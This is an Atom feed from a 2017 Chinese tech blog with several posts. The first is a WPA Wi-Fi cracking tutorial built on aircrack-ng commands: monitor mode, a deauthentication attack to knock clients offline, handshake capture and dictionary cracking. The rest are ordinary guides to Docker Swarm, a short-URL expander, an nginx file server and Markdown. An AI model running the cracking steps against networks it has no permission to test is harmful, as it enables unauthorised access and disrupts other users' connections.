<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>黑色时间</title>
  
  <subtitle>在时间的长河中，每一个人生,每一个事迹都是沧海里的一粟，人们苦苦追求，穿越那片黑色的时间</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.an-time.top/"/>
  <updated>2017-11-08T00:51:00.000Z</updated>
  <id>http://www.an-time.top/</id>
  
  <author>
    <name>an_time</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>破解Wi-Fi密码</title>
    <link href="http://www.an-time.top/2017/11/07/%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81/"/>
    <id>http://www.an-time.top/2017/11/07/破解Wi-Fi密码/</id>
    <published>2017-11-07T13:03:46.000Z</published>
    <updated>2017-11-08T00:51:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p>目前无线渗透试的两种方法：1、抓握手包，跑包。2、通过WPS进行跑pin码<br>当然第2种方法是要求路由器开启了wps功能。并且要求路由器没有设置pin防护，其它的方法如路由器漏洞等不在此讨论范围内。<br>WEP方式认证的路由器已经很少了，而且这种认证方式不但非常不安全且绝对可破，不再讲解，本文只讲WPA认证方式的渗透方法。<br>其实最有效的取得密码的方法是直接编个理由过去问！（社工）<br>原理：抓到的包中有密码的密文，做暴力跑包即可。</p><h1 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h1><ol><li>kali操作系统</li><li>一个支持监听模式的无线网卡</li></ol><h1 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h1><h3 id="1-开启无线网卡监听模式"><a href="#1-开启无线网卡监听模式" class="headerlink" title="1.开启无线网卡监听模式"></a>1.开启无线网卡监听模式</h3><ul><li><p>查看无线网卡</p><pre><code>$ifconfig -a </code></pre><p><img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/look.png" alt="查看无线网卡"></p></li></ul><p>可以从上图看出设备识别的无线网卡名字为wlan0</p><ul><li><p>激活无线网卡</p><pre><code>$ifconfig wlan0 up</code></pre><p>  没有任何提示，在linux下没有报错就是没有错 </p></li><li><p>杀死干扰进程</p><pre><code>$airmon-ng check kill</code></pre><p>  <img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/kill.png" alt="杀死干扰进程"></p><p>  从上面图片可以看出，有关干扰进程都被杀掉</p></li><li><p>开启网卡监听模式</p><pre><code>$airmon-ng start wlan0</code></pre><p>  使用上面的命令开启网卡的监听模式，记录下监听模式的名字，为mon0，如下图</p><p>  <img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/monitor-module.png" alt="开启网卡监听模式"></p><p>  再次查看设备，发现多出来一个监听模式的网卡信息，见下图<br>  <img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/look2.png" alt="查看网卡信息"></p></li></ul><h3 id="2-监听周围wifi状态，寻找要破解的无线路由器"><a href="#2-监听周围wifi状态，寻找要破解的无线路由器" class="headerlink" title="2.监听周围wifi状态，寻找要破解的无线路由器"></a>2.监听周围wifi状态，寻找要破解的无线路由器</h3><pre><code>$airodump-ng mon0</code></pre><p>使用上面的命令，可以监听到周围的无线网络，从中选择我们要破解的路由器的ssid，见下图</p><p><img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/monitor1.png" alt="监听周围无线网络"></p><p>1:路由器mac地址</p><p>2:信号强度</p><p>3:路由器工作频道</p><p>4:wifi名字</p><p>5:连接在路由器的客户端的mac地址</p><h3 id="3-监听要破解的路由器，攻击连接的无线设备使其自动掉线然后重连，来抓取握手包"><a href="#3-监听要破解的路由器，攻击连接的无线设备使其自动掉线然后重连，来抓取握手包" class="headerlink" title="3.监听要破解的路由器，攻击连接的无线设备使其自动掉线然后重连，来抓取握手包"></a>3.监听要破解的路由器，攻击连接的无线设备使其自动掉线然后重连，来抓取握手包</h3><p>下面我们来破解名字为14_102的路由器，可以看出其mac地址为8C:A6:DF:69:DB:33，信道为6，使用下面命令监听该路由器并把监听的数据保存到名字为wifi里</p><pre><code>$airodump-ng mon0 -c 6 --bssid 8C:A6:DF:69:DB:33 -w wifi</code></pre><p>-c:信道</p><p>–bssid:路由器mac地址</p><p>-w:保存数据的名字</p><p>在另一个终端来攻击连在该路由器的客户端，使其掉线然后自动重连，就能监控到含有密码的握手包</p><pre><code>$aireplay-ng -0 1 -a 8C:A6:DF:69:DB:33 -c 00:CD:FE:65:46:5A mon0</code></pre><p>-a:路由器mac地址</p><p>-c:客户端的mac地址，可以不加该参数，会把连在该路由器上的所有客户端搞掉线</p><p><img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/attack.png" alt="无线攻击"><br>测试的客户端是我的手机，发现手机掉线了，然后自动重新连接wifi。自动连接上后（握手成功），看到在监听端口出现如下标志，说明抓取握手包成功，可以停止攻击和监控<br><img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/get-package.png" alt="抓住握手包"></p><p>查看抓到的包的数据如下图<br><img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/packages.png" alt="抓到的包"></p><h3 id="4-用字典跑包"><a href="#4-用字典跑包" class="headerlink" title="4.用字典跑包"></a>4.用字典跑包</h3><p>下面用我们的字典来跑抓到的数据包</p><pre><code>$aircrack-ng -w dic.txt wifi-01.cap</code></pre><p>成功爆出密码<br><img src="http://www.an-time.top/an_time.site.pictures/WifiCrack/get-sec.png" alt="爆出密码"></p><h1 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h1><p>此文仅用于研究测试，请不要做破坏，博主不承担任何责任。。。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; title=&quot;简介：&quot;&gt;&lt;/a&gt;简介：&lt;/h1&gt;&lt;p&gt;目前无线渗透试的两种方法：1、抓握手包，跑包。2、通过WPS进行跑pin码&lt;br&gt;当然第2种方法是要求路由器开启了wps功能。并且要
      
    
    </summary>
    
    
      <category term="破解wifi" scheme="http://www.an-time.top/tags/%E7%A0%B4%E8%A7%A3wifi/"/>
    
      <category term="kali" scheme="http://www.an-time.top/tags/kali/"/>
    
      <category term="aircrack-ng" scheme="http://www.an-time.top/tags/aircrack-ng/"/>
    
  </entry>
  
  <entry>
    <title>docker swarm集群搭建</title>
    <link href="http://www.an-time.top/2017/11/06/docker-swarm%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"/>
    <id>http://www.an-time.top/2017/11/06/docker-swarm集群搭建/</id>
    <published>2017-11-06T03:28:22.000Z</published>
    <updated>2017-11-06T06:54:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p>dokcer swarm是一个docker集群管理工具，把大量的docker容器集中管理，类似的还有k8s等。</p><h1 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h1><p>本案例需要2台以上机器，这里使用docker machine来生成3台虚拟机来测试。可根据自己资源多少来选择不同的方案。<br>创建一个管理节点机器manager1，两个工作节点worker1和worker2</p><pre><code>#docker-machine create --driver virtualbox manager1#docker-machine create --driver virtualbox worker1#docker-machine create --driver virtualbox worker2</code></pre><p>现在，有两三台虚拟机，我们查看一下：</p><pre><code>#docker-machine lsNAME       ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORSmanager1   -        virtualbox   Running   tcp://192.168.99.100:2376           v17.10.0-ceworker1    -        virtualbox   Running   tcp://192.168.99.103:2376           v17.10.0-ceworker2    -        virtualbox   Running   tcp://192.168.99.104:2376           v17.10.0-ce</code></pre><h1 id="创建swarm集群："><a href="#创建swarm集群：" class="headerlink" title="创建swarm集群："></a>创建swarm集群：</h1><p>用上面创建的3台虚拟机，来创建一个swarm集群，首先进入管理节点：</p><pre><code>#docker-machine ssh manager1#docker swarm init --listen-addr 192.168.99.100:2377 --advertise-addr 192.168.99.100Swarm initialized: current node (23lkbq7uovqsg550qfzup59t6) is now a manager.To add a worker to this swarm, run the following command:docker swarm join \--token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r \192.168.99.100:2377To add a manager to this swarm, run &apos;docker swarm join-token manager&apos; and follow the instructions.</code></pre><p>上面用 –listen-addr来指定监听的ip和端口。</p><p>接下来把worker1和worker2加入集群：</p><pre><code>#docker-machine ssh worker1#docker swarm join --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r 192.168.99.100:2377#docker-machine ssh worker2#docker swarm join --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r 192.168.99.100:2377</code></pre><p>上面可以加入参数–listen-addr作为监听准备，因为有时候可能遇到把一个worker节点提升为manager节点。本例不添加。</p><p>初始化成功后，现在，我们拥有了一个主节点两个从节点的swarm集群，进入管理节点查看一下相应信息：</p><pre><code>#docker-machine ssh manager1#docker node lsID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUStdbdcsorrtqymgmn71t5pfwxm *   manager1            Ready               Active              Leaderb5twxb6zeacvndsklkxenlhk2     worker1             Ready               Activexdvapziebpux1iee52d4tvqa9     worker2             Ready               Active</code></pre><p>现在，每个节点都归属于swarm，并处于待机状态。manager1是管理节点，worker1和worker2是工作节点。</p><p>在管理节点上查看网络状态：</p><pre><code>#docker-machine ssh manager1#docker network lsNETWORK ID          NAME                DRIVER              SCOPEde994a4d6a4f        bridge              bridge              localca45f2e489de        docker_gwbridge     bridge              local3d22755e453b        host                host                localrgpmn1hh5qe1        ingress             overlay             swarm86b55cffdbd2        none                null                local</code></pre><p>可以看到在 swarm 上默认已有一个名为 ingress 的 overlay 网络, 默认在 swarm 里使用，本例子中会创建一个新的 overlay 网络。</p><pre><code>#docker network create --driver overlay swarm_test#docker network lsNETWORK ID          NAME                DRIVER              SCOPEde994a4d6a4f        bridge              bridge              localca45f2e489de        docker_gwbridge     bridge              local3d22755e453b        host                host                localrgpmn1hh5qe1        ingress             overlay             swarm86b55cffdbd2        none                null                localn9jduvforkcm        swarm_test          overlay             swarm</code></pre><p>可以看到我们创建的网络swarm_test。</p><h1 id="在跨主机网络上部署应用："><a href="#在跨主机网络上部署应用：" class="headerlink" title="在跨主机网络上部署应用："></a>在跨主机网络上部署应用：</h1><p>首先，分别在各个节点上下载一个要部署应用的镜像：</p><pre><code>#docker-machine ssh manager1#docker pull nginx#docker-machine ssh worker1#docker pull nginx#docker-machine ssh worker2#docker pull nginx</code></pre><p>上面分别在3个节点上下载了nginx的镜像，下面在swarm中部署nginx应用：</p><pre><code>#docker service create --replicas 2 -p 7080:80 --name hello --networ=swarm_test nginx</code></pre><p>查看服务：</p><pre><code>#docker service lsID                  NAME                MODE                REPLICAS            IMAGE               PORTSsl4zi20wk6um        hello               replicated          2/2                 nginx:latest        *:7080-&gt;80/tcp</code></pre><p>查看hello的详细情况：</p><pre><code>#docker service ps helloID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE         ERROR               PORTS0b3pykmkl7i9        hello.2             nginx:latest        manager1            Running             Running 2 hours agos7ud2yba1p0r        hello.3             nginx:latest        worker1             Running             Running 2 hours ago</code></pre><p>可以看出，两个容器分别运行在管理节点和worker1节点。</p><h1 id="swarm自我修复能力："><a href="#swarm自我修复能力：" class="headerlink" title="swarm自我修复能力："></a>swarm自我修复能力：</h1><p>上面我们创建的service里面有两个实例，现在我们尝试一下杀掉其中一个实例，观察其反应：</p><ol><li><p>杀掉worker1中的容器：</p><pre><code>#docker-machine ssh worker1#docker kill 4f9d65b4ab70</code></pre></li><li><p>查看服务实例状态：</p><pre><code>#docker-machine ssh manager1#docker service ps helloID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE           ERROR                         PORTSz9jbg1psmh7n        hello.1             nginx:latest        worker1             Running             Running 1 second agojhfcp9axso7m         \_ hello.1         nginx:latest        worker1             Shutdown            Failed 7 seconds ago    &quot;task: non-zero exit (137)&quot;y8rbt67vpkfe        hello.2             nginx:latest        manager1            Running             Running 5 minutes ago</code></pre><p>可以看到，其中一个容器为shutdown状态，然后又启动了另外一个容器来代替关闭的容器</p></li></ol><h1 id="动态修改实例数："><a href="#动态修改实例数：" class="headerlink" title="动态修改实例数："></a>动态修改实例数：</h1><p>假如某个服务负载过大，我们可以对该服务动态平滑的扩容，当负载减下来的时候，可以减少容器数量，只需指定scale参数即可。我们用上面创建的hello服务来说明：</p><pre><code>#docker-machines ssh manager1#docker service scale hello=3hello scaled to 3overall progress: 3 out of 3 tasks1/3: running   [==================================================&gt;]2/3: running   [==================================================&gt;]3/3: running   [==================================================&gt;]verify: Service converged</code></pre><p>此时，查看服务，发现容器数量变成3个了：</p><pre><code>#docker service ps helloID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE            ERROR               PORTSveq6koi71ff8        hello.1             nginx:latest        manager1            Running             Running 26 seconds agoe42vqpp5fvbf        hello.2             nginx:latest        worker1             Running             Running 26 seconds agotic4n5absao7        hello.3             nginx:latest        worker2             Running             Running 12 seconds ago</code></pre><p>现在，我们把容器减少到2个：</p><pre><code>#docker service scale hello=2hello scaled to 2overall progress: 2 out of 2 tasks1/2: running   [==================================================&gt;]2/2: running   [==================================================&gt;]verify: Service converged</code></pre><p>此时，查看服务，发现容器数量变成了2:</p><pre><code>#docker service ps helloID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE           ERROR               PORTSe42vqpp5fvbf        hello.2             nginx:latest        worker1             Running             Running 3 minutes agotic4n5absao7        hello.3             nginx:latest        worker2             Running             Running 3 minutes ago</code></pre><h1 id="删除服务："><a href="#删除服务：" class="headerlink" title="删除服务："></a>删除服务：</h1><p>假如某个服务我们不在需要了，可以直接把高服务删除。现在我们把上面创建的hello服务删除：</p><pre><code>#docker-machines ssh managers1#docker service rm hello</code></pre><p>再次查看服务，发现hello服务已经被删除了：</p><pre><code>#docker service lsID                  NAME                MODE                REPLICAS            IMAGE               PORTS</code></pre><h1 id="删除节点："><a href="#删除节点：" class="headerlink" title="删除节点："></a>删除节点：</h1><p>完成上面的测试，最终删除我们的虚拟机manager1，worker1和worker2:</p><pre><code>#docker-machine lsNAME       ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORSmanager1   -        virtualbox   Running   tcp://192.168.99.100:2376           v17.10.0-ceworker1    -        virtualbox   Running   tcp://192.168.99.103:2376           v17.10.0-ceworker2    -        virtualbox   Running   tcp://192.168.99.104:2376           v17.10.0-ce</code></pre><p>删除虚拟机：</p><pre><code>#docker-machine rm manager1 worker1 worker2About to remove manager1, worker1, worker2WARNING: This action will delete both local reference and remote instance.Are you sure? (y/n): ySuccessfully removed manager1Successfully removed worker1Successfully removed worker2</code></pre><p>再次查看，已经没有了：</p><pre><code>#docker-machine lsNAME   ACTIVE   DRIVER   STATE   URL   SWARM   DOCKER   ERRORS</code></pre><h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>swarm的基本姿势大致如上，我们可以把他用在我们的生产环境，与持续集成，持续部署等结合起来，最终可以达到无人值守的目的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; title=&quot;简介：&quot;&gt;&lt;/a&gt;简介：&lt;/h1&gt;&lt;p&gt;dokcer swarm是一个docker集群管理工具，把大量的docker容器集中管理，类似的还有k8s等。&lt;/p&gt;
&lt;h1 id
      
    
    </summary>
    
    
      <category term="docker swarm" scheme="http://www.an-time.top/tags/docker-swarm/"/>
    
      <category term="虚拟化" scheme="http://www.an-time.top/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
      <category term="集群" scheme="http://www.an-time.top/tags/%E9%9B%86%E7%BE%A4/"/>
    
  </entry>
  
  <entry>
    <title>短网址还原工具</title>
    <link href="http://www.an-time.top/2017/10/24/%E7%9F%AD%E7%BD%91%E5%9D%80%E8%BF%98%E5%8E%9F%E5%B7%A5%E5%85%B7/"/>
    <id>http://www.an-time.top/2017/10/24/短网址还原工具/</id>
    <published>2017-10-24T01:20:10.000Z</published>
    <updated>2017-11-24T01:32:33.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p>随着安全意识的不断提升，很多都开始使用短网址。这里写了一个小工具，实现把短网址还原成原来的网址。</p><h1 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h1><pre><code>#coding = utf8import urllib2, httplib, os, sysclass RedirectHandler(urllib2.HTTPRedirectHandler):    def http_error_301(self, req, fp, code, msg, headers):        result = urllib2.HTTPRedirectHandler.http_error_301(self, req, fp, code, msg, headers)        result.status = code        return result    def http_error_302(self, req, fp, code, msg, headers):        result = urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)        result.status = code        return result# Bannerdef Banner():    print(&quot;=================================================&quot;)    print(&quot;                pyLongURL                        &quot;)    print(&quot;=================================================&quot;)# Usagedef help_menu(cmd):    print(&quot;Usage: %s &lt;short_URL&gt;\n&quot;) % (cmd)    print(&quot;Please enter need an URL!&quot;)def main(szURL):    httplib.HTTPConnection.debuglevel = 1    request = urllib2.Request(szURL)    opener = urllib2.build_opener(RedirectHandler())    f = opener.open(request)    print(f.url)if __name__ == &quot;__main__&quot;:    Banner()    if len(sys.argv)&lt;2:        help_menu(sys.argv[0])    else:        main(sys.argv[1])</code></pre><h1 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h1><p><img src="http://www.an-time.top/an_time.site.pictures/shotUrl/test.png" alt="测试结果"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; title=&quot;简介：&quot;&gt;&lt;/a&gt;简介：&lt;/h1&gt;&lt;p&gt;随着安全意识的不断提升，很多都开始使用短网址。这里写了一个小工具，实现把短网址还原成原来的网址。&lt;/p&gt;
&lt;h1 id=&quot;实现：&quot;&gt;
      
    
    </summary>
    
    
      <category term="短网址还原" scheme="http://www.an-time.top/tags/%E7%9F%AD%E7%BD%91%E5%9D%80%E8%BF%98%E5%8E%9F/"/>
    
      <category term="工具" scheme="http://www.an-time.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>用nginx搭建文件服务器</title>
    <link href="http://www.an-time.top/2017/09/22/%E7%94%A8nginx%E6%90%AD%E5%BB%BA%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://www.an-time.top/2017/09/22/用nginx搭建文件服务器/</id>
    <published>2017-09-22T03:15:53.000Z</published>
    <updated>2017-11-22T04:34:25.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>工作需要，搭建一个文件服务器。</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>先创建一台虚拟机，ip地址为：106.14.242.15</p><p><img src="http://an-time.top/an_time.site.pictures/fileSystem/environment.png" alt="环境"></p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><ul><li><p>配置源系统源</p><pre><code># wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</code></pre></li><li><p>安装nginx</p><pre><code># yum install nginx -y</code></pre></li><li><p>查找配置文件</p><pre><code># rpm -qc nginx</code></pre><p>可以看到配置文件如下图：<br><img src="http://an-time.top/an_time.site.pictures/fileSystem/setting.png" alt="配置文件">    </p></li><li><p>修改配置文件</p><pre><code>#cat /etc/nginx/nginx.conf# For more information on configuration, see:#   * Official English Documentation: http://nginx.org/en/docs/#   * Official Russian Documentation: http://nginx.org/ru/docs/user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;events {    worker_connections 1024;}http {    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;              &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;              &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;    access_log  /var/log/nginx/access.log  main;    sendfile            on;    tcp_nopush          on;    tcp_nodelay         on;    keepalive_timeout   65;    types_hash_max_size 2048;    include             /etc/nginx/mime.types;    default_type        application/octet-stream;    # Load modular configuration files from the /etc/nginx/conf.d directory.    # See http://nginx.org/en/docs/ngx_core_module.html#include    # for more information.    include /etc/nginx/conf.d/*.conf;    server {        listen       80 ;        server_name  test.file.com;        charset utf-8;        # Load configuration files for the default server block.        location / {        root  /data;          index  index.php index.html index.htm;         autoindex on;         autoindex_exact_size on;        autoindex_localtime on;        }        access_log  /var/log/file.log;        error_page 404 /404.html;        location = /40x.html {        }        error_page 500 502 503 504 /50x.html;        location = /50x.html {        }    }}</code></pre></li><li><p>创建文件目录和测试数据</p><pre><code># mkdir /data# cd /data# touch 123.txt# echo &apos;test&apos; &gt; 123.txt</code></pre></li></ul><h1 id="结果测试"><a href="#结果测试" class="headerlink" title="结果测试"></a>结果测试</h1><p>浏览器访问地址，如下图：<br><img src="http://an-time.top/an_time.site.pictures/fileSystem/test1.png" alt="测试"><img src="http://an-time.top/an_time.site.pictures/fileSystem/test2.png" alt="测试2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;工作需要，搭建一个文件服务器。&lt;/p&gt;
&lt;h1 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
      <category term="nginx" scheme="http://www.an-time.top/tags/nginx/"/>
    
      <category term="文件服务器" scheme="http://www.an-time.top/tags/%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Markdown教程</title>
    <link href="http://www.an-time.top/2017/08/14/Markdown%E6%95%99%E7%A8%8B/"/>
    <id>http://www.an-time.top/2017/08/14/Markdown教程/</id>
    <published>2017-08-14T14:54:19.000Z</published>
    <updated>2017-11-23T15:05:44.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p>Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。Markdown 从写作到完成，导出格式随心所欲，你可以导出 HTML 格式的文件用来网站发布，也可以十分方便的导出 PDF 格式。</p><h1 id="1-标题"><a href="#1-标题" class="headerlink" title="1. 标题"></a>1. 标题</h1><p>为了获得上面的 “<code>1. 标题</code>”， 在 Markdown 编辑器里输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># 1. 标题</div></pre></td></tr></table></figure><p>“<code>#</code>” 后最好加个空格。除此之外，还有 5 级标题，依次有不同的字体大小，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">## 二级标题</div><div class="line">### 三级标题</div><div class="line">#### 四级标题</div><div class="line">##### 五级标题</div><div class="line">###### 六级标题</div></pre></td></tr></table></figure><p>这样就有：</p><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><h1 id="2-字体"><a href="#2-字体" class="headerlink" title="2. 字体"></a>2. 字体</h1><p>最常用的强调方式，那就是 <strong>加粗</strong> 了，你得这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">最常用的强调方式，那就是 **加粗** 了，你得这样：</div></pre></td></tr></table></figure><p>通常我喜欢在 “<code>**加粗的部分**</code>” 旁边各加一个空格，当然你也可以不这样。<br>斜体则多用在于书名，比如：我从来没看过 <em>Jane Eyre</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">斜体则多用在于书名，比如：我从来没看过 *Jane Eyre*</div></pre></td></tr></table></figure><p>但中文的斜体我觉得真是不美，像：《<em>简 · 爱</em>》，一般还是别用了。</p><hr><h1 id="3-层次"><a href="#3-层次" class="headerlink" title="3. 层次"></a>3. 层次</h1><p>比如写个读书笔记，你得</p><h4 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h4><ol><li>第一节</li></ol><ul><li>第二节(你不用敲 “2”，自动就有了）<ul><li>第一小节（推荐每层次缩进四个空格）<ul><li>小小节 1</li><li>小小节 2</li></ul></li><li>第二小节</li></ul></li></ul><p>也不难：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#### 第一章</div><div class="line"></div><div class="line">1. 第一节</div><div class="line">* 第二节(你不用敲 &quot;2&quot;，自动就有了）</div><div class="line">    * 第一小节（推荐每层次缩进四个空格）</div><div class="line">        * 小小节 1</div><div class="line">        * 小小节 2</div><div class="line">    * 第二小节</div></pre></td></tr></table></figure><p>“<code>*</code>” 后面要加空格，这是必须的，除了 <code>*</code>，还可以使用 <code>+</code> 或者 <code>-</code>。</p><p>如果格式出现问题，多加个空行，一般就好了。</p><hr><h1 id="4-链接，图片"><a href="#4-链接，图片" class="headerlink" title="4. 链接，图片"></a>4. 链接，图片</h1><p>你：我没读过 <em>Jane Eyre</em><br>我：以后别跟我说话！<br>你：。。。<br>我：我也没读过，但是， <a href="http://book.douban.com/subject/1141406/" target="_blank" rel="external"><strong><em>Jane Eyre</em></strong></a> is not just <strong><em>Jane Eyre</em></strong><br><img src="http://img3.douban.com/mpic/s1108264.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">我：我也没读过，但是， [***Jane Eyre***](http://book.douban.com/subject/1141406/) is not just ***Jane Eyre***</div><div class="line">![](http://img3.douban.com/mpic/s1108264.jpg)</div></pre></td></tr></table></figure><hr><h1 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a><a href="chrome://not-a-link" target="_blank" rel="external">5. 其他</a></h1><p>你可能还没注意到本文每部分之间的分割线和 <code>其他</code> 的链接其实没有链接<br>我爱 <code>分割线</code>， 我爱 <a href="chrome://not-a-link" target="_blank" rel="external"><strong>链接</strong></a>，哪怕它只有颜色~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line"></div><div class="line"># [5. 其他][null-link]</div><div class="line"></div><div class="line">你可能还没注意到本文每部分之间的分割线和 `其他` 的链接其实没有链接</div><div class="line">我爱 `分割线`， 我爱 [**链接**][null-link]，哪怕它只有颜色~</div><div class="line"></div><div class="line">[null-link]: chrome://not-a-link</div></pre></td></tr></table></figure><p>“<code>---</code>” 的上下最好各空一行</p><hr><p><strong>P.S.</strong> 补充一种高端的链接: <a href="http://www.google.com.sg" title="Google Sg 更快，更好用。好，现在单击吧" target="_blank" rel="external">鼠标移过来，<strong>先别单击</strong> ~</a></p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">**P.S.** 补充一种高端的链接: [鼠标移过来，**先别单击** ~][hover]</div><div class="line">[hover]: http://www.google.com.sg &quot;Google Sg 更快，更好用。好，现在单击吧&quot;</div></pre></td></tr></table></figure><p>（可惜 Google 被墙了）</p><p><strong>P.P.S.</strong> 图片链接：(点击图片可跳转）<br><a href="http://book.douban.com/subject/1141406/" target="_blank" rel="external"><img src="http://img3.douban.com/mpic/s1108264.jpg" alt=""></a></p><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[![][jane-eyre-pic]][jane-eyre-douban]</div><div class="line">[jane-eyre-pic]: http://img3.douban.com/mpic/s1108264.jpg</div><div class="line">[jane-eyre-douban]: http://book.douban.com/subject/1141406/</div></pre></td></tr></table></figure></p><p>（简书最新的 Markdown 不能使用图片链接。。。感受不爱）<br><strong>P.P.P.S.</strong></p><p>更多的 Markdown 特性测试，见我的 <a href="http://jianshu.io/p/6827f850f723" target="_blank" rel="external">Markdown 一篇博客</a></p><p>在简书中输入数学公式：见我的 <a href="http://jianshu.io/p/e8a14ec1c614" target="_blank" rel="external">简书中编辑数学公式</a></p><p>如何写出漂亮的 Markdown 文章？戳 <a 